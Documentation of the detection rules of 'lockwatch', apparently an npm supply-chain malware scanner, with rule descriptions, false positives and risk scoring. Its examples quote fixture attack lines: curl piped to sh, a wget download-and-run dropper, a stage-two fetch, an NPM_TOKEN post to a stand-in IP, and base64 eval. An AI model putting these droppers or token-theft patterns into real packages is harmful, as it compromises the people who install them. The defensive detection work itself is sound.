# Detection rules

lockwatch v1 has twelve static rules. Each finding has a rule ID, a severity
(`critical`, `high`, `medium`, `low`, `info`), the package and version, the
file and line when there is one, an evidence snippet of at most 200
characters, and a one-sentence explanation. `lockwatch rules` lists them.

"Install-time code" below means: the files run by the `preinstall`,
`install`, `postinstall` or `prepare` scripts in `package.json` (including
files reached through `npm run <name>`, one level), the local files those
files `require` or `import` (one level deep), and inline `node -e` code.

The "known false positives" come from scanning the 500 most downloaded npm
packages (`eval/results/summary.md`, run of 2026-10-11). Counts are numbers
of packages out of 500.

---

## LW001 Install script present (`low`, `info` for native builds)

**Detects:** a `preinstall`, `install`, `postinstall` or `prepare` script.
`info` when every command in it is `node-gyp` or `prebuild-install`.

**Why it matters:** install scripts are how most malicious packages run:
the code executes as soon as someone runs `npm install`.

**Known false positives:** very common and usually harmless (55 of 500).
Many are `prepare` scripts (for example `minimatch`, `glob`, `lru-cache`),
which npm only runs for git and local installs, not for registry tarballs;
the explanation says so. LW001 alone scores 3 and never flags a package.

**Example:** `fixtures/packages/malicious/lwfx-curl-pipe-sh`:
`"postinstall": "curl -fsSL https://example.invalid/install.sh | sh"`.

## LW002 Install script downloads or executes remote code (`high`)

**Detects:** in install script text (and scripts reached with `npm run`,
and shell scripts they run such as `sh scripts/setup.sh`): `curl`/`wget`
piped into a shell, download then `chmod +x`/run, `node -e` with network
calls, `powershell -EncodedCommand`, PowerShell download cradles
(`Invoke-WebRequest`, `iwr`, `DownloadString`, `iex`), base64 decoded into
an interpreter, `eval` of base64, and `python -c` with network modules.

**Why it matters:** one-line droppers fetch the real payload at install time,
so the package itself looks almost empty.

**Known false positives:** none in the top 500. Legitimate installers that
download with `curl` and then run the file would match.

**Example:** `lwfx-wget-chmod-run`:
`wget -q -O /tmp/.lwfx http://203.0.113.10/x && chmod +x /tmp/.lwfx && /tmp/.lwfx`.

## LW003 Install-time file uses child_process (`high`)

**Detects:** calls to `exec`, `execSync`, `execFile`, `execFileSync`,
`spawn`, `spawnSync` or `fork` from `child_process` in install-time code,
found with the syntax tree. Sees through aliases (`const r = require`),
renamed destructuring (`{ spawn: run }`), ES imports, `node:` prefixes,
split or encoded module names (`'child_' + 'process'`,
`Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64')`), computed members
(`cp['ex' + 'ec']`) and `.call`/`.apply`. If the module is loaded but no
call can be resolved, the import itself is reported.

**Why it matters:** install-time code that starts programs can do anything
the user can.

**Known false positives:** `esbuild` (checks its platform binary with
`execFileSync`) and `pnpm` (runs `node` with `spawnSync`). Packages that
build native code from source (`@parcel/watcher` in the benchmark lockfile)
also match.

**Example:** `lwfx-cp-in-helper`: `install.js` only requires
`./lib/util`, which calls `childProcess.execFile('/bin/sh', ...)`.

## LW004 Install-time network access (`high`)

**Detects:** install-time code that loads `http`, `https`, `http2`, `net`,
`tls`, `dns`, `dgram` or a common HTTP client (`axios`, `node-fetch`, `got`,
`request`, `undici`, `needle`, `superagent`), or calls `fetch()`. Hard-coded
IP addresses and host names in the same file are reported as extra findings
naming the host.

**Why it matters:** the network is how a second stage is fetched and how
stolen data leaves the machine.

**Known false positives:** `esbuild` (falls back to downloading its binary
from registry.npmjs.org). Not lowered for registry-only hosts: an attacker
can publish a second stage to npm too.

**Example:** `lwfx-net-ip`: `https.get('https://203.0.113.20/stage2', ...)`.

## LW005 Credential or secret access (`high`, `critical` with LW004)

**Detects,** in every JavaScript file (not only install-time code):
- reads of environment variables whose name matches `NPM_TOKEN`,
  `GITHUB_TOKEN`, `GH_TOKEN`, `AWS_*`, `*SECRET*` or `*KEY*`
  (case-insensitive), through `process.env.X`, `process.env['X']`,
  destructuring or an alias of `process.env`,
- `JSON.stringify(process.env)` (every variable at once),
- string literals naming `.npmrc`, `.ssh/`, `.aws/credentials` or
  `.git-credentials` (or the `.ssh`/`.aws` pieces passed to `path.join`), when
  the same file calls `readFile`, `readFileSync` or `createReadStream`.

`critical` when the same install-time file also triggers LW004.

**Why it matters:** stealing npm, GitHub and cloud tokens is the most common
goal of malicious npm packages.

**Known false positives:** `pnpm` (a package manager that legitimately reads
`.npmrc`, and reads `COREPACK_INTEGRITY_KEYS`). SDKs that read their own API
key from the environment match `*KEY*` (`lwfx-ok-sdk-api-key` models this).

**Example:** `lwfx-steal-env-token`: posts `process.env.NPM_TOKEN` to
`203.0.113.22` from its postinstall file (critical, score 100).

## LW006 Dynamic code execution (`medium`)

**Detects:** `eval(...)` (also `(0, eval)(...)` and `globalThis.eval`),
`new Function(...)` and `Function(...)`, `vm.runInThisContext`,
`vm.runInNewContext`, `vm.runInContext`, `vm.compileFunction`,
`new vm.Script`, and `require()` with an argument that cannot be computed
statically.

**Why it matters:** decoded payloads are usually handed to one of these, so
the dangerous code never appears in the source.

**Known false positives:** common (31 of 500): schema compilers and
templates (`ajv`, `lodash`), `Function('return this')` global detection
(`qs`, `json5`), and plugin loaders (`require(path)`). A medium finding
alone scores 12 (level `low`).

**Example:** `lwfx-eval-payload`: `eval(Buffer.from(payload, 'base64').toString())`.

## LW007 Obfuscation (`medium`)

**Detects,** per JavaScript file, each reported separately:
- a string literal over 1,000 characters with Shannon entropy above 5.0
  bits per character,
- more than 30% of the file made of `\xNN`/`\uNNNN` escapes (files of 200
  bytes or more),
- a line over 5,000 characters in a file not named `*.min.js` (or
  `.min.cjs`/`.min.mjs`),
- at least 10 `_0x1a2b`-style identifiers and at least 2 per KB
  (javascript-obfuscator).

**Why it matters:** malware hides its payload; legitimate source rarely needs
to.

**Known false positives:** common (31 of 500): bundled `dist/` files with long
lines (`@babel/types`, `qs`, `json5`), Unicode tables written as escapes
(`emoji-regex`, `tr46`), and generated data (`entities`). Thresholds are
heuristics. A medium finding alone scores 12 (level `low`).

**Example:** `lwfx-obf-entropy`: a 3,000-character random base64 string
(5.98 bits/char) that is decoded and `eval`ed.

## LW008 Possible typosquat (`medium`)

**Detects:** a package name that is not on the popular list but is within
Damerau-Levenshtein distance 1 (names of 5 to 9 characters) or 2 (10 or
more) of a popular name, or equal to one after removing `-`, `_`, `.`, `@`
and `/` (separator and scope confusion). Names under 5 characters are not
compared by distance.

**Why it matters:** typosquats rely on a mistyped `npm install`.

**Known false positives:** legitimate sibling packages that are not on the
list: `call-bound` (2 edits from `call-bind`) and `object.assign` (separator
confusion with `object-assign`). The list does not include deprecated
packages (see below), so typosquats of `request` or `aws-sdk` are missed.

**Example:** `expresss` (1 edit from `express`), `cross_env` (separators).

### The popular list (`crates/lockwatch-core/data/popular.txt`)

Generated by `node scripts/build_popular.ts` from a fixed, hand-picked list
of well-known packages (`scripts/popular-seed.txt`) with their weekly
download counts, on **2026-10-11**. Source: the npm downloads API was
blocked from the build environment, so the counts come from the npm registry
search API (`downloads.weekly`); the file header records this. 468 of 486
seed names were found; the search API omits deprecated packages, so 18 are
missing (`request`, `aws-sdk`, `node-sass`, `q`, ...). The list is a
snapshot and will drift.

## LW009 Very new version (`low`)

**Detects:** this version was published less than 7 days before the scan
(the registry's `time[version]`). `--now` sets the scan time for
reproducible results.

**Why it matters:** most malicious versions are found and removed within
days; a brand-new version has had little scrutiny.

**Known false positives:** any active project (49 of 500 at the time of the
run, for example `uuid`, `postcss`, `acorn`). Low on purpose.

**Example:** `lwfx-fresh-release` (published 2026-10-18, scanned as of
2026-10-20).

## LW010 Maintainer change (`medium`, `info` for a move to trusted publishing)

**Detects:** the npm user who published this version published none of the
previous 5 versions (ordered by publish time). For versions published with
npm trusted publishing (OIDC from CI), the maintainer who approved the
release is compared instead; with no approver recorded, the change is
reported as `info`.

**Why it matters:** account takeovers and hostile handovers show up as a new
publisher.

**Known false positives:** ordinary maintainer rotation (16 of 500 above
`info`, for example `source-map`, `micromatch`, `statuses`). Before the
trusted-publishing refinement, 33 packages matched, 19 of them releases
published by "GitHub Actions".

**Example:** `lwfx-new-maintainer`: 1.0.0 published by `mallory`, previous
five by `alice` and `bob`.

## LW011 Unexpected binary (`low`)

**Detects:** files with ELF, Mach-O or PE magic bytes, or named `.node`,
`.exe`, `.dll`, `.so` or `.dylib`, in a package whose manifest declares no
native build. A native build is declared by `gypfile`, a node-pre-gyp
`binary` section, `os` or `cpu` (platform packages), a dependency on a
native build helper (`node-gyp-build`, `prebuild-install`, `bindings`,
`nan`, `node-addon-api`, ...), or an install script that runs one. Files
over the 5 MB analysis limit are still checked (their first 512 bytes are
kept).

**Why it matters:** binaries cannot be reviewed like source, and an
undeclared one has no reason to be there.

**Known false positives:** none in the top 500.

**Example:** `lwfx-hidden-elf` ships `bin/.cache/update` (ELF header).

## LW012 Integrity mismatch (`critical`)

**Detects:** the tarball does not match the lockfile's `integrity` hash
(sha512, sha384, sha256 or sha1; the strongest one present is used). Checked
after download and again every time a cached tarball is read. A mismatched
package is not analysed further.

**Why it matters:** the registry, a mirror, a proxy or the cache served
different bytes than the ones that were locked.

**Known false positives:** none expected; a lockfile edited by hand can
trigger it.

**Example:** `lwfx-tampered`: every fixture lockfile carries a wrong hash for
it.

---

## Risk score

Defined in `crates/lockwatch-core/src/score.rs`:

| Severity | Weight |
|---|---:|
| critical | 60 |
| high | 30 |
| medium | 12 |
| low | 3 |
| info | 0 |

- Each rule that fired adds the weight of its **most severe** finding (a rule
  counts once per package, however many times it fired).
- +15 if LW004 and LW005 fired in the same file.
- Capped at 100.

| Score | Level |
|---|---|
| 0 to 9 | none |
| 10 to 29 | low |
| 30 to 59 | medium |
| 60 to 79 | high |
| 80 to 100 | critical |

The evaluation calls a package "flagged" when its level is medium or above.
One consequence: a single `medium` signal (for example only LW006, LW007 or
LW008) scores 12 and stays at level `low`, and a single `low` signal (LW009,
LW011) scores 3. 17 of the 43 malicious fixtures show only such signals (at
most one `medium` rule plus `low` ones, or two `medium` rules) and stay below
medium; see `eval/results/summary.md`.

## Limits and known gaps

- Static analysis only. Code that is downloaded or decrypted at runtime, or
  behaviour that depends on the environment, is not seen.
- One flat scope per file, no data flow between functions or files (beyond
  one level of install-time requires). A determined attacker can hide a call
  from it.
- Files that do not parse use regexes, which also match comments.
- Files larger than 5 MB, entries after 10,000, and data after 50 MB per
  package are not analysed (a warning says so).
- At most 5 findings per rule per file and 25 per rule per package are
  listed; a warning gives the number left out.
